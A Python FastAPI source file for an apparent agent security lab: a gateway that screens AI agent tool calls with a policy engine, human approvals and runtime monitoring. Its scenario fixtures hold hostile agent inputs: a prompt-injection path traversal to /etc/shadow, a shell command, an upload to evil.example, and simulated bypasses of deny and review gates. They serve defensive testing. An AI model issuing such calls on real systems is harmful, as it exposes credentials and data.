from __future__ import annotations

import asyncio
import json
import os
from collections import deque
from contextlib import asynccontextmanager
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from uuid import uuid4

import httpx
from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.responses import FileResponse
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client
from mcp.types import TextContent
from opentelemetry import trace
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from pydantic import BaseModel, Field, model_validator

from app.capability import argument_fingerprint, issue_capability
from app.ocsf import to_ocsf_api_activity, to_ocsf_detection_finding
from app.runtime import RuntimeMonitor, verify_sensor_signature


OPA_DECISION_URL = os.getenv(
    "OPA_DECISION_URL", "http://opa:8181/v1/data/agent_security/decision"
)
MCP_SERVER_URL = os.getenv("MCP_SERVER_URL", "http://mcp-server:8000/mcp")
MAX_ARGUMENT_BYTES = 4096
MAX_SENSOR_PAYLOAD_BYTES = 16384
MAX_APPROVAL_RECORDS = 200
APPROVAL_TTL_SECONDS = int(os.getenv("APPROVAL_TTL_SECONDS", "300"))
DASHBOARD_PATH = Path(__file__).parent / "static" / "index.html"


def configure_tracing() -> trace.Tracer:
    provider = TracerProvider(
        resource=Resource.create(
            {"service.name": os.getenv("OTEL_SERVICE_NAME", "agent-gateway")}
        )
    )
    endpoint = os.getenv("OTEL_EXPORTER_OTLP_ENDPOINT")
    if endpoint:
        provider.add_span_processor(
            BatchSpanProcessor(OTLPSpanExporter(endpoint=endpoint, insecure=True))
        )
    trace.set_tracer_provider(provider)
    return trace.get_tracer(__name__)


tracer = configure_tracing()
events: deque[dict[str, Any]] = deque(maxlen=200)
runtime_monitor = RuntimeMonitor(max_records=200)


SCENARIOS: dict[str, dict[str, Any]] = {
    "safe_document": {
        "title": "Approved public document read",
        "tool": "read_document",
        "arguments": {"path": "public/guide.txt"},
        "expected_action": "allow",
        "owasp": None,
    },
    "indirect_prompt_injection": {
        "title": "Indirect prompt injection requests path traversal",
        "tool": "read_document",
        "arguments": {"path": "../../etc/shadow"},
        "expected_action": "deny",
        "owasp": "ASI01 Agent Behavior Hijacking",
    },
    "tool_misuse": {
        "title": "Agent attempts shell execution",
        "tool": "run_command",
        "arguments": {"command": "id"},
        "expected_action": "deny",
        "owasp": "ASI02 Tool Misuse and Exploitation",
    },
    "data_exfiltration": {
        "title": "Agent attempts an external HTTP transfer",
        "tool": "mock_http_request",
        "arguments": {"url": "https://evil.example/upload"},
        "expected_action": "review",
        "owasp": "ASI05 Unexpected Code Execution / Data Exfiltration",
    },
}

RUNTIME_SCENARIOS: dict[str, dict[str, str]] = {
    "matched_file_read": {
        "title": "Allowed file read matches runtime evidence",
        "base_scenario": "safe_document",
        "event_type": "file_access",
        "process": "python",
        "target": "/app/documents/public/guide.txt",
    },
    "denied_process_bypass": {
        "title": "Process executes after policy deny",
        "base_scenario": "tool_misuse",
        "event_type": "process_exec",
        "process": "/bin/sh",
        "target": "/bin/sh",
    },
    "network_exfiltration_bypass": {
        "title": "Outbound connection bypasses review gate",
        "base_scenario": "data_exfiltration",
        "event_type": "network_connect",
        "process": "python",
        "target": "203.0.113.10:443",
    },
}


class ToolInvocation(BaseModel):
    tool: str = Field(min_length=1, max_length=64, pattern=r"^[a-z][a-z0-9_]*$")
    arguments: dict[str, Any] = Field(default_factory=dict)
    actor: str = Field(default="lab-analyst", min_length=1, max_length=64)
    scenario_id: str | None = Field(default=None, max_length=64)

    @model_validator(mode="after")
    def validate_argument_size(self) -> "ToolInvocation":
        size = len(json.dumps(self.arguments, ensure_ascii=False).encode("utf-8"))
        if size > MAX_ARGUMENT_BYTES:
            raise ValueError(f"Tool arguments exceed {MAX_ARGUMENT_BYTES} bytes.")
        return self


class PolicyDecision(BaseModel):
    allow: bool
    action: str
    risk_score: int
    reasons: list[str]


class ApprovalAction(BaseModel):
    approver: str = Field(min_length=2, max_length=64)
    justification: str = Field(min_length=8, max_length=500)


@dataclass
class ApprovalRecord:
    approval_id: str
    event_id: str
    invocation: ToolInvocation | None
    tool: str
    actor: str
    argument_keys: list[str]
    argument_fingerprint: str
    policy_decision: PolicyDecision
    requested_at: datetime
    expires_at: datetime
    status: str = "pending"
    approver: str | None = None
    justification: str | None = None
    resolved_at: datetime | None = None


approvals: dict[str, ApprovalRecord] = {}
approval_lock = asyncio.Lock()


@asynccontextmanager
async def lifespan(_: FastAPI):
    if len(os.getenv("APPROVAL_HMAC_KEY", "")) < 32:
        raise RuntimeError("APPROVAL_HMAC_KEY must contain at least 32 characters.")
    if len(os.getenv("RUNTIME_SENSOR_HMAC_KEY", "")) < 32:
        raise RuntimeError("RUNTIME_SENSOR_HMAC_KEY must contain at least 32 characters.")
    async with httpx.AsyncClient(timeout=10.0) as client:
        app.state.http_client = client
        yield


app = FastAPI(
    title="Agent Runtime Security Lab",
    version="0.8.0",
    description=(
        "Policy-enforced MCP gateway with eBPF, Kubernetes identity, and "
        "audit/RBAC attack-chain correlation."
    ),
    lifespan=lifespan,
)


def approval_view(record: ApprovalRecord) -> dict[str, Any]:
    return {
        "approval_id": record.approval_id,
        "event_id": record.event_id,
        "status": record.status,
        "tool": record.tool,
        "actor": record.actor,
        "argument_keys": record.argument_keys,
        "argument_fingerprint": record.argument_fingerprint,
        "risk_score": record.policy_decision.risk_score,
        "reasons": record.policy_decision.reasons,
        "requested_at": record.requested_at.isoformat(),
        "expires_at": record.expires_at.isoformat(),
        "approver": record.approver,
        "justification": record.justification,
        "resolved_at": record.resolved_at.isoformat() if record.resolved_at else None,
    }


def expire_pending_approvals() -> None:
    now = datetime.now(UTC)
    for record in approvals.values():
        if record.status == "pending" and record.expires_at <= now:
            record.status = "expired"
            record.resolved_at = now
            record.invocation = None


async def evaluate_policy(invocation: ToolInvocation) -> PolicyDecision:
    payload = {
        "input": {
            "tool": invocation.tool,
            "arguments": invocation.arguments,
            "actor": invocation.actor,
            "scenario_id": invocation.scenario_id,
        }
    }
    try:
        response = await app.state.http_client.post(OPA_DECISION_URL, json=payload)
        response.raise_for_status()
        result = response.json().get("result")
        if not result:
            raise ValueError("OPA returned no decision result.")
        return PolicyDecision.model_validate(result)
    except (httpx.HTTPError, ValueError) as exc:
        raise HTTPException(status_code=503, detail=f"Policy engine unavailable: {exc}") from exc


async def invoke_mcp_tool(tool: str, arguments: dict[str, Any]) -> list[str]:
    try:
        async with streamable_http_client(MCP_SERVER_URL) as streams:
            read_stream, write_stream, _ = streams
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()
                result = await session.call_tool(tool, arguments=arguments)
                if result.isError:
                    raise ValueError("MCP tool returned an error.")
                return [item.text for item in result.content if isinstance(item, TextContent)]
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"MCP tool call failed: {exc}") from exc


def build_event(
    event_id: str,
    invocation: ToolInvocation,
    decision: PolicyDecision,
    executed: bool,
    output: list[str],
    approval_id: str | None = None,
    approver: str | None = None,
) -> dict[str, Any]:
    return {
        "event_id": event_id,
        "timestamp": datetime.now(UTC).isoformat(),
        "actor": invocation.actor,
        "approver": approver,
        "scenario_id": invocation.scenario_id,
        "tool": invocation.tool,
        "argument_keys": sorted(invocation.arguments.keys()),
        "argument_fingerprint": argument_fingerprint(invocation.arguments),
        "decision": decision.model_dump(),
        "approval_id": approval_id,
        "executed": executed,
        "output": output,
    }


async def process_invocation(invocation: ToolInvocation) -> dict[str, Any]:
    event_id = str(uuid4())
    with tracer.start_as_current_span("invoke_agent lab-security-agent") as agent_span:
        agent_span.set_attribute("gen_ai.operation.name", "invoke_agent")
        agent_span.set_attribute("gen_ai.agent.name", "lab-security-agent")
        agent_span.set_attribute("security.event.id", event_id)
        if invocation.scenario_id:
            agent_span.set_attribute("security.scenario.id", invocation.scenario_id)

        with tracer.start_as_current_span(f"execute_tool {invocation.tool}") as tool_span:
            tool_span.set_attribute("gen_ai.operation.name", "execute_tool")
            tool_span.set_attribute("gen_ai.tool.name", invocation.tool)
            tool_span.set_attribute(
                "security.arguments.sha256", argument_fingerprint(invocation.arguments)
            )

            decision = await evaluate_policy(invocation)
            tool_span.set_attribute("security.policy.action", decision.action)
            tool_span.set_attribute("security.risk.score", decision.risk_score)
            tool_span.set_attribute("security.policy.allowed", decision.allow)

            output: list[str] = []
            executed = False
            runtime_monitor.register_intent(
                intent_id=event_id,
                tool=invocation.tool,
                actor=invocation.actor,
                policy_action=decision.action,
                executed=decision.allow,
            )
            if decision.allow:
                output = await invoke_mcp_tool(invocation.tool, invocation.arguments)
                executed = True

    approval_id: str | None = None
    if decision.action == "review" and not decision.allow:
        approval_id = str(uuid4())
        requested_at = datetime.now(UTC)
        record = ApprovalRecord(
            approval_id=approval_id,
            event_id=event_id,
            invocation=invocation.model_copy(deep=True),
            tool=invocation.tool,
            actor=invocation.actor,
            argument_keys=sorted(invocation.arguments.keys()),
            argument_fingerprint=argument_fingerprint(invocation.arguments),
            policy_decision=decision,
            requested_at=requested_at,
            expires_at=requested_at + timedelta(seconds=APPROVAL_TTL_SECONDS),
        )
        async with approval_lock:
            expire_pending_approvals()
            while len(approvals) >= MAX_APPROVAL_RECORDS:
                oldest_id = next(iter(approvals))
                del approvals[oldest_id]
            approvals[approval_id] = record

    event = build_event(
        event_id,
        invocation,
        decision,
        executed,
        output,
        approval_id=approval_id,
    )
    if approval_id:
        event["approval"] = approval_view(approvals[approval_id])
    events.appendleft(event)
    return event


@app.get("/", include_in_schema=False)
async def dashboard() -> FileResponse:
    return FileResponse(DASHBOARD_PATH)


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "ok", "service": "agent-gateway", "version": "0.8.0"}


@app.get("/api/scenarios")
async def list_scenarios() -> dict[str, dict[str, Any]]:
    return SCENARIOS


@app.post("/api/scenarios/{scenario_id}")
async def run_scenario(scenario_id: str) -> dict[str, Any]:
    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        raise HTTPException(status_code=404, detail="Unknown scenario.")
    invocation = ToolInvocation(
        tool=scenario["tool"],
        arguments=scenario["arguments"],
        scenario_id=scenario_id,
    )
    result = await process_invocation(invocation)
    result["expected_action"] = scenario["expected_action"]
    result["expectation_met"] = (
        result["decision"]["action"] == scenario["expected_action"]
    )
    return result


@app.post("/api/invoke")
async def invoke_tool(invocation: ToolInvocation) -> dict[str, Any]:
    return await process_invocation(invocation)


@app.get("/api/events")
async def list_events() -> list[dict[str, Any]]:
    return list(events)


@app.get("/api/events/ocsf")
async def list_ocsf_events() -> list[dict[str, Any]]:
    return [to_ocsf_api_activity(event) for event in events]


@app.get("/api/runtime/scenarios")
async def list_runtime_scenarios() -> dict[str, dict[str, str]]:
    return RUNTIME_SCENARIOS


@app.post("/api/runtime/scenarios/{scenario_id}")
async def run_runtime_scenario(scenario_id: str) -> dict[str, Any]:
    scenario = RUNTIME_SCENARIOS.get(scenario_id)
    if not scenario:
        raise HTTPException(status_code=404, detail="Unknown runtime scenario.")
    base = SCENARIOS[scenario["base_scenario"]]
    event = await process_invocation(
        ToolInvocation(
            tool=base["tool"],
            arguments=base["arguments"],
            scenario_id=scenario["base_scenario"],
        )
    )
    finding = runtime_monitor.ingest(
        {
            "intent_id": event["event_id"],
            "source": "simulator",
            "event_type": scenario["event_type"],
            "process": scenario["process"],
            "target": scenario["target"],
            "container": "arsl-mcp-server",
        }
    )
    return {"event": event, "finding": finding}


@app.post("/api/runtime/observations")
async def ingest_runtime_observation(
    request: Request,
    x_sensor_signature: str = Header(default=""),
) -> dict[str, Any]:
    raw_payload = await request.body()
    if len(raw_payload) > MAX_SENSOR_PAYLOAD_BYTES:
        raise HTTPException(status_code=413, detail="Runtime sensor payload is too large.")
    if not verify_sensor_signature(raw_payload, x_sensor_signature):
        raise HTTPException(status_code=401, detail="Invalid runtime sensor signature.")
    try:
        payload = json.loads(raw_payload)
        if not isinstance(payload, dict):
            raise ValueError("Sensor payload must be a JSON object.")
        finding = runtime_monitor.ingest(payload)
    except (json.JSONDecodeError, ValueError) as exc:
        raise HTTPException(status_code=422, detail=str(exc)) from exc
    return {"accepted": True, "finding": finding}


@app.get("/api/runtime/intents")
async def list_runtime_intents() -> list[dict[str, Any]]:
    return runtime_monitor.intent_list()


@app.get("/api/runtime/observations")
async def list_runtime_observations() -> list[dict[str, Any]]:
    return runtime_monitor.observation_list()


@app.get("/api/runtime/findings")
async def list_runtime_findings() -> list[dict[str, Any]]:
    return runtime_monitor.finding_list()


@app.get("/api/runtime/status")
async def runtime_status() -> dict[str, Any]:
    return runtime_monitor.status()


@app.get("/api/runtime/ocsf")
async def list_runtime_ocsf_findings() -> list[dict[str, Any]]:
    return [to_ocsf_detection_finding(item) for item in runtime_monitor.finding_list()]


@app.get("/api/approvals")
async def list_approvals() -> list[dict[str, Any]]:
    async with approval_lock:
        expire_pending_approvals()
        return [approval_view(record) for record in reversed(approvals.values())]


@app.post("/api/approvals/{approval_id}/approve")
async def approve_invocation(
    approval_id: str, action: ApprovalAction
) -> dict[str, Any]:
    async with approval_lock:
        expire_pending_approvals()
        record = approvals.get(approval_id)
        if not record:
            raise HTTPException(status_code=404, detail="Unknown approval request.")
        if record.status != "pending" or record.invocation is None:
            raise HTTPException(
                status_code=409,
                detail=f"Approval request is already {record.status}.",
            )
        record.status = "executing"
        record.approver = action.approver
        record.justification = action.justification
        invocation = record.invocation.model_copy(deep=True)
        expires_at = int(record.expires_at.timestamp())

    execution_event_id = str(uuid4())
    runtime_monitor.register_intent(
        intent_id=execution_event_id,
        tool=invocation.tool,
        actor=invocation.actor,
        policy_action="allow",
        executed=True,
    )
    try:
        capability = issue_capability(
            invocation.tool,
            invocation.arguments,
            approval_id,
            expires_at,
        )
        approved_arguments = dict(invocation.arguments)
        approved_arguments["capability"] = capability
        with tracer.start_as_current_span("human_approved_tool_execution") as span:
            span.set_attribute("security.approval.id", approval_id)
            span.set_attribute("security.approver", action.approver)
            output = await invoke_mcp_tool(invocation.tool, approved_arguments)
    except Exception:
        async with approval_lock:
            record.status = "failed"
            record.resolved_at = datetime.now(UTC)
            record.invocation = None
        raise

    decision = PolicyDecision(
        allow=True,
        action="allow",
        risk_score=record.policy_decision.risk_score,
        reasons=["A human approved the pending tool invocation."],
    )
    event = build_event(
        execution_event_id,
        invocation,
        decision,
        True,
        output,
        approval_id=approval_id,
        approver=action.approver,
    )
    events.appendleft(event)

    async with approval_lock:
        record.status = "approved"
        record.resolved_at = datetime.now(UTC)
        record.invocation = None
        view = approval_view(record)
    return {"approval": view, "execution": event}


@app.post("/api/approvals/{approval_id}/deny")
async def deny_invocation(
    approval_id: str, action: ApprovalAction
) -> dict[str, Any]:
    async with approval_lock:
        expire_pending_approvals()
        record = approvals.get(approval_id)
        if not record:
            raise HTTPException(status_code=404, detail="Unknown approval request.")
        if record.status != "pending" or record.invocation is None:
            raise HTTPException(
                status_code=409,
                detail=f"Approval request is already {record.status}.",
            )
        invocation = record.invocation.model_copy(deep=True)
        record.status = "denied"
        record.approver = action.approver
        record.justification = action.justification
        record.resolved_at = datetime.now(UTC)
        record.invocation = None
        view = approval_view(record)

    decision = PolicyDecision(
        allow=False,
        action="deny",
        risk_score=record.policy_decision.risk_score,
        reasons=["A human denied the pending tool invocation."],
    )
    event = build_event(
        str(uuid4()),
        invocation,
        decision,
        False,
        [],
        approval_id=approval_id,
        approver=action.approver,
    )
    events.appendleft(event)
    return {"approval": view, "execution": event}
